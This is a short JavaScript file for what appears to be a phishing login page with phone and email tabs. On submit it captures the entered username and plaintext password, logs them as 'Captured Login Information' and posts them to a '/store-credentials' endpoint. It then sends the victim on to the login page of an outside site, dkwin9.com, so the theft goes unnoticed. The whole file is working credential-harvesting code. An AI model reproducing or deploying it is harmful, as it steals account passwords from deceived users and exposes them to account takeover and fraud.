// ==========================
// script.js
// ==========================

// Tab switching
document.querySelectorAll(".tab").forEach(tab => {
  tab.addEventListener("click", () => {
    document.querySelectorAll(".tab").forEach(t => t.classList.remove("active"));
    document.querySelectorAll(".tab-content").forEach(c => c.classList.remove("active"));

    tab.classList.add("active");
    document.getElementById(tab.dataset.tab).classList.add("active");
  });
});

// Password toggle
const toggle = document.getElementById("togglePassword");
const passwordInput = document.getElementById("password");

toggle.addEventListener("click", () => {
  passwordInput.type =
    passwordInput.type === "password" ? "text" : "password";
});

// Login button
const loginButton = document.getElementById("loginButton");

loginButton.addEventListener("click", async () => {
  // 🔒 disable button to prevent double click
  loginButton.disabled = true;

  try {
    // Determine active tab (phone or email)
    const activeTab = document.querySelector(".tab.active").dataset.tab;

    const username =
      activeTab === "phone"
        ? document.getElementById("phone-input").value
        : document.getElementById("email-input").value;

    const passwordValue = passwordInput.value;

    // Debug log (local + Vercel logs)
    console.log("Captured Login Information:", {
      type: activeTab,
      username,
      password_length: passwordValue.length
    });

    // Send data to backend
    const response = await fetch("/store-credentials", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        type: activeTab,
        username: username,
        password: passwordValue
      })
    });

    if (!response.ok) {
      console.error("Server responded with error");
    }

  } catch (error) {
    console.error("Error sending data:", error);
  } finally {
    // 🔓 re-enable button
    loginButton.disabled = false;

    // Redirect after request completes
    window.location.href = "https://dkwin9.com/#/login";
  }
});
